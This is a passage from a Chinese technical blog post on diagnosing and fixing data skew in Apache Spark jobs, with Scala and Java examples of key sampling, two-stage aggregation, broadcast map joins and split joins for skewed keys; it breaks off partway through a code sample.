by语句），那么就可以判定，以那个地方为界限划分出了前后两个stage。</p><h2 id="4-2-代码实例"><a href="#4-2-代码实例" class="headerlink" title="4.2 代码实例"></a>4.2 代码实例</h2><p>这里我们就以Spark最基础的入门程序——单词计数来举例，如何用最简单的方法大致推算出一个stage对应的代码。如下示例，在整个代码中，只有一个reduceByKey是会发生shuffle的算子，因此就可以认为，以这个算子为界限，会划分出前后两个stage。 * stage0，主要是执行从textFile到map操作，以及执行shuffle write操作。shuffle write操作，我们可以简单理解为对pairs RDD中的数据进行分区操作，每个task处理的数据中，相同的key会写入同一个磁盘文件内。 * stage1，主要是执行从reduceByKey到collect操作，stage1的各个task一开始运行，就会首先执行shuffle read操作。执行shuffle read操作的task，会从stage0的各个task所在节点拉取属于自己处理的那些key，然后对同一个key进行全局性的聚合或join等操作，在这里就是对key的value值进行累加。stage1在执行完reduceByKey算子之后，就计算出了最终的wordCounts RDD，然后会执行collect算子，将所有数据拉取到Driver上，供我们遍历和打印输出。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>()</span><br><span class="line"><span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(conf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> lines = sc.textFile(<span class="string">&quot;hdfs://...&quot;</span>)</span><br><span class="line"><span class="keyword">val</span> words = lines.flatMap(_.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line"><span class="keyword">val</span> pairs = words.map((_, <span class="number">1</span>))</span><br><span class="line"><span class="keyword">val</span> wordCounts = pairs.reduceByKey(_ + _)</span><br><span class="line"></span><br><span class="line">wordCounts.collect().foreach(println(_))</span><br></pre></td></tr></table></figure><p>通过对单词计数程序的分析，希望能够让大家了解最基本的stage划分的原理，以及stage划分后shuffle操作是如何在两个stage的边界处执行的。然后我们就知道如何快速定位出发生数据倾斜的stage对应代码的哪一个部分了。比如我们在Spark Web UI或者本地log中发现，stage1的某几个task执行得特别慢，判定stage1出现了数据倾斜，那么就可以回到代码中定位出stage1主要包括了reduceByKey这个shuffle类算子，此时基本就可以确定是由educeByKey算子导致的数据倾斜问题。比如某个单词出现了100万次，其他单词才出现10次，那么stage1的某个task就要处理100万数据，整个stage的速度就会被这个task拖慢。</p><h2 id="4-3-某个task莫名其妙内存溢出的情况"><a href="#4-3-某个task莫名其妙内存溢出的情况" class="headerlink" title="4.3 某个task莫名其妙内存溢出的情况"></a>4.3 某个task莫名其妙内存溢出的情况</h2><p>这种情况下去定位出问题的代码就比较容易了。我们建议直接看yarn-client模式下本地log的异常栈，或者是通过YARN查看yarn-cluster模式下的log中的异常栈。一般来说，通过异常栈信息就可以定位到你的代码中哪一行发生了内存溢出。然后在那行代码附近找找，一般也会有shuffle类算子，此时很可能就是这个算子导致了数据倾斜。</p><p>但是大家要注意的是，不能单纯靠偶然的内存溢出就判定发生了数据倾斜。因为自己编写的代码的bug，以及偶然出现的数据异常，也可能会导致内存溢出。因此还是要按照上面所讲的方法，通过Spark Web UI查看报错的那个stage的各个task的运行时间以及分配的数据量，才能确定是否是由于数据倾斜才导致了这次内存溢出。</p><h2 id="4-4-查看导致数据倾斜的key的数据分布情况"><a href="#4-4-查看导致数据倾斜的key的数据分布情况" class="headerlink" title="4.4 查看导致数据倾斜的key的数据分布情况"></a>4.4 查看导致数据倾斜的key的数据分布情况</h2><p>知道了数据倾斜发生在哪里之后，通常需要分析一下那个执行了shuffle操作并且导致了数据倾斜的RDD&#x2F;Hive表，查看一下其中key的分布情况。这主要是为之后选择哪一种技术方案提供依据。针对不同的key分布与不同的shuffle算子组合起来的各种情况，可能需要选择不同的技术方案来解决。</p><p>此时根据你执行操作的情况不同，可以有很多种查看key分布的方式： 1. 如果是Spark SQL中的group by、join语句导致的数据倾斜，那么就查询一下SQL中使用的表的key分布情况。 2. 如果是对Spark RDD执行shuffle算子导致的数据倾斜，那么可以在Spark作业中加入查看key分布的代码，比如RDD.countByKey()。然后对统计出来的各个key出现的次数，collect&#x2F;take到客户端打印一下，就可以看到key的分布情况。</p><h2 id="4-5-key分布示例"><a href="#4-5-key分布示例" class="headerlink" title="4.5 key分布示例"></a>4.5 key分布示例</h2><p>举例来说，对于上面所说的单词计数程序，如果确定了是stage1的reduceByKey算子导致了数据倾斜，那么就应该看看进行reduceByKey操作的RDD中的key分布情况，在这个例子中指的就是pairs RDD。如下示例，我们可以先对pairs采样10%的样本数据，然后使用countByKey算子统计出每个key出现的次数，最后在客户端遍历和打印样本数据中各个key的出现次数。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> sampledPairs = pairs.sample(<span class="literal">false</span>, <span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">val</span> sampledWordCounts = sampledPairs.countByKey()</span><br><span class="line">sampledWordCounts.foreach(println(_))</span><br></pre></td></tr></table></figure><h1 id="五：数据倾斜的解决方案"><a href="#五：数据倾斜的解决方案" class="headerlink" title="五：数据倾斜的解决方案"></a>五：数据倾斜的解决方案</h1><h2 id="解决方案一：使用Hive-ETL预处理数据"><a href="#解决方案一：使用Hive-ETL预处理数据" class="headerlink" title="解决方案一：使用Hive ETL预处理数据"></a>解决方案一：使用Hive ETL预处理数据</h2><p><strong>方案适用场景：</strong>导致数据倾斜的是Hive表。如果该Hive表中的数据本身很不均匀（比如某个key对应了100万数据，其他key才对应了10条数据），而且业务场景需要频繁使用Spark对Hive表执行某个分析操作，那么比较适合使用这种技术方案。</p><p><strong>方案实现思路：</strong>此时可以评估一下，是否可以通过Hive来进行数据预处理（即通过Hive ETL预先对数据按照key进行聚合，或者是预先和其他表进行join），然后在Spark作业中针对的数据源就不是原来的Hive表了，而是预处理后的Hive表。此时由于数据已经预先进行过聚合或join操作了，那么在Spark作业中也就不需要使用原先的shuffle类算子执行这类操作了。</p><p><strong>方案实现原理：</strong>这种方案从根源上解决了数据倾斜，因为彻底避免了在Spark中执行shuffle类算子，那么肯定就不会有数据倾斜的问题了。但是这里也要提醒一下大家，这种方式属于治标不治本。因为毕竟数据本身就存在分布不均匀的问题，所以Hive ETL中进行group by或者join等shuffle操作时，还是会出现数据倾斜，导致Hive ETL的速度很慢。我们只是把<strong>数据倾斜的发生提前到了Hive ETL中</strong>，避免Spark程序发生数据倾斜而已。</p><p><strong>方案优点：</strong>实现起来简单便捷，效果还非常好，完全规避掉了数据倾斜，Spark作业的性能会大幅度提升。</p><p><strong>方案缺点：</strong>治标不治本，Hive ETL中还是会发生数据倾斜。</p><p><strong>方案实践经验：</strong>在一些Java系统与Spark结合使用的项目中，会出现Java代码频繁调用Spark作业的场景，而且对Spark作业的执行性能要求很高，就比较适合使用这种方案。将数据倾斜提前到上游的Hive ETL，每天仅执行一次，只有那一次是比较慢的，而之后每次Java调用Spark作业时，执行速度都会很快，能够提供更好的用户体验。</p><p><strong>项目实践经验：</strong>在美团·点评的交互式用户行为分析系统中使用了这种方案，该系统主要是允许用户通过Java Web系统提交数据分析统计任务，后端通过Java提交Spark作业进行数据分析统计。要求Spark作业速度必须要快，尽量在10分钟以内，否则速度太慢，用户体验会很差。所以我们将有些Spark作业的shuffle操作提前到了Hive ETL中，从而让Spark直接使用预处理的Hive中间表，尽可能地减少Spark的shuffle操作，大幅度提升了性能，将部分作业的性能提升了6倍以上。</p><h2 id="解决方案二：过滤少数导致倾斜的key"><a href="#解决方案二：过滤少数导致倾斜的key" class="headerlink" title="解决方案二：过滤少数导致倾斜的key"></a>解决方案二：过滤少数导致倾斜的key</h2><p><strong>方案适用场景：</strong>如果发现导致倾斜的key就少数几个，而且对计算本身的影响并不大的话，那么很适合使用这种方案。比如99%的key就对应10条数据，但是只有一个key对应了100万数据，从而导致了数据倾斜。</p><p><strong>方案实现思路：</strong>如果我们判断那少数几个数据量特别多的key，对作业的执行和计算结果不是特别重要的话，那么干脆就直接过滤掉那少数几个key。比如，在Spark SQL中可以使用where子句过滤掉这些key或者在Spark Core中对RDD执行filter算子过滤掉这些key。如果需要每次作业执行时，动态判定哪些key的数据量最多然后再进行过滤，那么可以使用sample算子对RDD进行采样，然后计算出每个key的数量，取数据量最多的key过滤掉即可。</p><p><strong>方案实现原理：</strong>将导致数据倾斜的key给过滤掉之后，这些key就不会参与计算了，自然不可能产生数据倾斜。</p><p><strong>方案优点：</strong>实现简单，而且效果也很好，可以完全规避掉数据倾斜。</p><p><strong>方案缺点：</strong>适用场景不多，大多数情况下，导致倾斜的key还是很多的，并不是只有少数几个。</p><p><strong>方案实践经验：</strong>在项目中我们也采用过这种方案解决数据倾斜。有一次发现某一天Spark作业在运行的时候突然OOM了，追查之后发现，是Hive表中的某一个key在那天数据异常，导致数据量暴增。因此就采取<strong>每次执行前先进行采样，计算出样本中数据量最大的几个key之后，直接在程序中将那些key给过滤掉。</strong></p><h2 id="解决方案三：提高shuffle操作的并行度"><a href="#解决方案三：提高shuffle操作的并行度" class="headerlink" title="解决方案三：提高shuffle操作的并行度"></a>解决方案三：提高shuffle操作的并行度</h2><p><strong>方案适用场景：</strong>如果我们必须要对数据倾斜迎难而上，那么建议优先使用这种方案，因为这是处理数据倾斜最简单的一种方案。</p><p><strong>方案实现思路：</strong>在对RDD执行shuffle算子时，给shuffle算子传入一个参数，比如reduceByKey(1000)，该参数就设置了这个shuffle算子执行时shuffle read task的数量。对于Spark SQL中的shuffle类语句，比如group by、join等，需要设置一个参数，即spark.sql.shuffle.partitions，该参数代表了shuffle read task的并行度，该值默认是200，对于很多场景来说都有点过小。</p><p><strong>方案实现原理：</strong>增加shuffle read task的数量，可以让原本分配给一个task的多个key分配给多个task，从而让每个task处理比原来更少的数据。举例来说，如果原本有5个key，每个key对应10条数据，这5个key都是分配给一个task的，那么这个task就要处理50条数据。而增加了shuffle read task以后，每个task就分配到一个key，即每个task就处理10条数据，那么自然每个task的执行时间都会变短了。具体原理如下图所示。</p><p><img src="/blog/ed3d1f39.html/1648879873365-498c4baf-0c86-4637-b1a1-ca41e41f181e.png" alt="img"></p><p><strong>方案优点：</strong>实现起来比较简单，可以有效缓解和减轻数据倾斜的影响。</p><p><strong>方案缺点：</strong>只是缓解了数据倾斜而已，没有彻底根除问题，根据实践经验来看，其效果有限。</p><p><strong>方案实践经验：</strong>该方案通常无法彻底解决数据倾斜，因为如果出现一些极端情况，比如某个key对应的数据量有100万，那么无论你的task数量增加到多少，这个对应着100万数据的key肯定还是会分配到一个task中去处理，因此注定还是会发生数据倾斜的。所以这种方案只能说是在发现数据倾斜时尝试使用的第一种手段，尝试去用最简单的方法缓解数据倾斜而已，或者是和其他方案结合起来使用。</p><h2 id="解决方案四：两阶段聚合（局部聚合-全局聚合）"><a href="#解决方案四：两阶段聚合（局部聚合-全局聚合）" class="headerlink" title="解决方案四：两阶段聚合（局部聚合+全局聚合）"></a>解决方案四：两阶段聚合（局部聚合+全局聚合）</h2><p><strong>方案适用场景：</strong>对RDD执行reduceByKey等聚合类shuffle算子或者在Spark SQL中使用group by语句进行分组聚合时，比较适用这种方案。</p><p><strong>方案实现思路：</strong>这个方案的核心实现思路就是进行两阶段聚合。第一次是局部聚合，先给每个key都打上一个随机数，比如10以内的随机数，此时原先一样的key就变成不一样的了，比如(hello, 1) (hello, 1) (hello, 1) (hello, 1)，就会变成(1_hello, 1) (1_hello, 1) (2_hello, 1) (2_hello, 1)。接着对打上随机数后的数据，执行reduceByKey等聚合操作，进行局部聚合，那么局部聚合结果，就会变成了(1_hello, 2) (2_hello, 2)。然后将各个key的前缀给去掉，就会变成(hello,2)(hello,2)，再次进行全局聚合操作，就可以得到最终结果了，比如(hello, 4)。</p><p><strong>方案实现原理：</strong>将原本相同的key通过附加随机前缀的方式，变成多个不同的key，就可以让原本被一个task处理的数据分散到多个task上去做局部聚合，进而解决单个task处理数据量过多的问题。接着去除掉随机前缀，再次进行全局聚合，就可以得到最终的结果。具体原理见下图。</p><p><strong>方案优点：</strong>对于聚合类的shuffle操作导致的数据倾斜，效果是非常不错的。通常都可以解决掉数据倾斜，或者至少是大幅度缓解数据倾斜，将Spark作业的性能提升数倍以上。</p><p><strong>方案缺点：</strong>仅仅适用于聚合类的shuffle操作，适用范围相对较窄。如果是join类的shuffle操作，还得用其他的解决方案。</p><p><img src="/blog/ed3d1f39.html/1648880080869-a084c2f2-4084-411b-8401-1e4252766ddc.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一步，给RDD中的每个key都打上一个随机前缀。</span></span><br><span class="line">JavaPairRDD&lt;String, Long&gt; randomPrefixRdd = rdd.mapToPair(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PairFunction</span>&lt;Tuple2&lt;Long,Long&gt;, String, Long&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Tuple2&lt;String, Long&gt; <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, Long&gt; tuple)</span></span><br><span class="line">                    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">                <span class="type">int</span> <span class="variable">prefix</span> <span class="operator">=</span> random.nextInt(<span class="number">10</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;String, Long&gt;(prefix + <span class="string">&quot;_&quot;</span> + tuple._1, tuple._2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 第二步，对打上随机前缀的key进行局部聚合。</span></span><br><span class="line">JavaPairRDD&lt;String, Long&gt; localAggrRdd = randomPrefixRdd.reduceByKey(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Long, Long, Long&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Long <span class="title function_">call</span><span class="params">(Long v1, Long v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> v1 + v2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 第三步，去除RDD中每个key的随机前缀。</span></span><br><span class="line">JavaPairRDD&lt;Long, Long&gt; removedRandomPrefixRdd = localAggrRdd.mapToPair(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PairFunction</span>&lt;Tuple2&lt;String,Long&gt;, Long, Long&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Tuple2&lt;Long, Long&gt; <span class="title function_">call</span><span class="params">(Tuple2&lt;String, Long&gt; tuple)</span></span><br><span class="line">                    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">originalKey</span> <span class="operator">=</span> Long.valueOf(tuple._1.split(<span class="string">&quot;_&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;Long, Long&gt;(originalKey, tuple._2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 第四步，对去除了随机前缀的RDD进行全局聚合。</span></span><br><span class="line">JavaPairRDD&lt;Long, Long&gt; globalAggrRdd = removedRandomPrefixRdd.reduceByKey(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Long, Long, Long&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Long <span class="title function_">call</span><span class="params">(Long v1, Long v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> v1 + v2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a></h3><h2 id="解决方案五：将reduce-join转为map-join"><a href="#解决方案五：将reduce-join转为map-join" class="headerlink" title="解决方案五：将reduce join转为map join"></a>解决方案五：将reduce join转为map join</h2><p><strong>方案适用场景：</strong>在对RDD使用join类操作，或者是在Spark SQL中使用join语句时，而且join操作中的一个RDD或表的数据量比较小（比如几百M或者一两G），比较适用此方案。</p><p><strong>方案实现思路：</strong>不使用join算子进行连接操作，而使用Broadcast变量与map类算子实现join操作，进而完全规避掉shuffle类的操作，彻底避免数据倾斜的发生和出现。将较小RDD中的数据直接通过collect算子拉取到Driver端的内存中来，然后对其创建一个Broadcast变量；接着对另外一个RDD执行map类算子，在算子函数内，从Broadcast变量中获取较小RDD的全量数据，与当前RDD的每一条数据按照连接key进行比对，如果连接key相同的话，那么就将两个RDD的数据用你需要的方式连接起来。</p><p><strong>方案实现原理：</strong>普通的join是会走shuffle过程的，而一旦shuffle，就相当于会将相同key的数据拉取到一个shuffle read task中再进行join，此时就是reduce join。但是如果一个RDD是比较小的，则可以采用广播小RDD全量数据+map算子来实现与join同样的效果，也就是map join，此时就不会发生shuffle操作，也就不会发生数据倾斜。具体原理如下图所示。</p><p><img src="/blog/ed3d1f39.html/1648880677360-20f904a3-03f6-44f4-bef4-01194d0e20f6.png" alt="img"></p><p><strong>方案优点：</strong>对join操作导致的数据倾斜，效果非常好，因为根本就不会发生shuffle，也就根本不会发生数据倾斜。</p><p><strong>方案缺点：</strong>适用场景较少，因为这个方案只适用于一个大表和一个小表的情况。毕竟我们需要将小表进行广播，此时会比较消耗内存资源，driver和每个Executor内存中都会驻留一份小RDD的全量数据。如果我们广播出去的RDD数据比较大，比如10G以上，那么就可能发生内存溢出了。因此并不适合两个都是大表的情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先将数据量比较小的RDD的数据，collect到Driver中来。</span></span><br><span class="line">List&lt;Tuple2&lt;Long, Row&gt;&gt; rdd1Data = rdd1.collect()</span><br><span class="line"><span class="comment">// 然后使用Spark的广播功能，将小RDD的数据转换成广播变量，这样每个Executor就只有一份RDD的数据。</span></span><br><span class="line"><span class="comment">// 可以尽可能节省内存空间，并且减少网络传输性能开销。</span></span><br><span class="line"><span class="keyword">final</span> Broadcast&lt;List&lt;Tuple2&lt;Long, Row&gt;&gt;&gt; rdd1DataBroadcast = sc.broadcast(rdd1Data);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 对另外一个RDD执行map类操作，而不再是join类操作。</span></span><br><span class="line">JavaPairRDD&lt;String, Tuple2&lt;String, Row&gt;&gt; joinedRdd = rdd2.mapToPair(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PairFunction</span>&lt;Tuple2&lt;Long,String&gt;, String, Tuple2&lt;String, Row&gt;&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Tuple2&lt;String, Tuple2&lt;String, Row&gt;&gt; <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, String&gt; tuple)</span></span><br><span class="line">                    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="comment">// 在算子函数中，通过广播变量，获取到本地Executor中的rdd1数据。</span></span><br><span class="line">                List&lt;Tuple2&lt;Long, Row&gt;&gt; rdd1Data = rdd1DataBroadcast.value();</span><br><span class="line">                <span class="comment">// 可以将rdd1的数据转换为一个Map，便于后面进行join操作。</span></span><br><span class="line">                Map&lt;Long, Row&gt; rdd1DataMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Long, Row&gt;();</span><br><span class="line">                <span class="keyword">for</span>(Tuple2&lt;Long, Row&gt; data : rdd1Data) &#123;</span><br><span class="line">                    rdd1DataMap.put(data._1, data._2);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 获取当前RDD数据的key以及value。</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> tuple._1;</span><br><span class="line">                <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> tuple._2;</span><br><span class="line">                <span class="comment">// 从rdd1数据Map中，根据key获取到可以join到的数据。</span></span><br><span class="line">                <span class="type">Row</span> <span class="variable">rdd1Value</span> <span class="operator">=</span> rdd1DataMap.get(key);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;String, String&gt;(key, <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;String, Row&gt;(value, rdd1Value));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 这里得提示一下。</span></span><br><span class="line"><span class="comment">// 上面的做法，仅仅适用于rdd1中的key没有重复，全部是唯一的场景。</span></span><br><span class="line"><span class="comment">// 如果rdd1中有多个相同的key，那么就得用flatMap类的操作，在进行join的时候不能用map，而是得遍历rdd1所有数据进行join。</span></span><br><span class="line"><span class="comment">// rdd2中每条数据都可能会返回多条join后的数据。</span></span><br></pre></td></tr></table></figure><h2 id="解决方案六：采样倾斜key并分拆join操作"><a href="#解决方案六：采样倾斜key并分拆join操作" class="headerlink" title="解决方案六：采样倾斜key并分拆join操作"></a>解决方案六：采样倾斜key并分拆join操作</h2><p><strong>方案适用场景：</strong>两个RDD&#x2F;Hive表进行join的时候，如果数据量都比较大，无法采用“解决方案五”，那么此时可以看一下两个RDD&#x2F;Hive表中的key分布情况。如果出现数据倾斜，是因为其中某一个RDD&#x2F;Hive表中的少数几个key的数据量过大，而另一个RDD&#x2F;Hive表中的所有key都分布比较均匀，那么采用这个解决方案是比较合适的。</p><p><strong>方案实现思路：</strong> * 对包含少数几个数据量过大的key的那个RDD，通过sample算子采样出一份样本来，然后统计一下每个key的数量，计算出来数据量最大的是哪几个key。 * 然后将这几个key对应的数据从原来的RDD中拆分出来，形成一个单独的RDD，并给每个key都打上n以内的随机数作为前缀，而不会导致倾斜的大部分key形成另外一个RDD。 * 接着将需要join的另一个RDD，也过滤出来那几个倾斜key对应的数据并形成一个单独的RDD，将每条数据膨胀成n条数据，这n条数据都按顺序附加一个0~n的前缀，不会导致倾斜的大部分key也形成另外一个RDD。 * 再将附加了随机前缀的独立RDD与另一个膨胀n倍的独立RDD进行join，此时就可以将原先相同的key打散成n份，分散到多个task中去进行join了。 * 而另外两个普通的RDD就照常join即可。 * 最后将两次join的结果使用union算子合并起来即可，就是最终的join结果。</p><p><strong>方案实现原理：</strong>对于join导致的数据倾斜，如果只是某几个key导致了倾斜，可以将少数几个key分拆成独立RDD，并附加随机前缀打散成n份去进行join，此时这几个key对应的数据就不会集中在少数几个task上，而是分散到多个task进行join了。具体原理见下图。</p><p><strong>方案优点：</strong>对于join导致的数据倾斜，如果只是某几个key导致了倾斜，采用该方式可以用最有效的方式打散key进行join。而且只需要针对少数倾斜key对应的数据进行扩容n倍，不需要对全量数据进行扩容。避免了占用过多内存。</p><p><strong>方案缺点：</strong>如果导致倾斜的key特别多的话，比如成千上万个key都导致数据倾斜，那么这种方式也不适合。</p><p><img src="/blog/ed3d1f39.html/1648881217470-bd1c1dc7-5fd4-4b13-8b3a-e9635a821029.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先从包含了少数几个导致数据倾斜key的rdd1中，采样10%的样本数据。</span></span><br><span class="line">JavaPairRDD&lt;Long, String&gt; sampledRDD = rdd1.sample(<span class="literal">false</span>, <span class="number">0.1</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 对样本数据RDD统计出每个key的出现次数，并按出现次数降序排序。</span></span><br><span class="line"><span class="comment">// 对降序排序后的数据，取出top 1或者top 100的数据，也就是key最多的前n个数据。</span></span><br><span class="line"><span class="comment">// 具体取出多少个数据量最多的key，由大家自己决定，我们这里就取1个作为示范。</span></span><br><span class="line">JavaPairRDD&lt;Long, Long&gt; mappedSampledRDD = sampledRDD.mapToPair(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PairFunction</span>&lt;Tuple2&lt;Long,String&gt;, Long, Long&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span 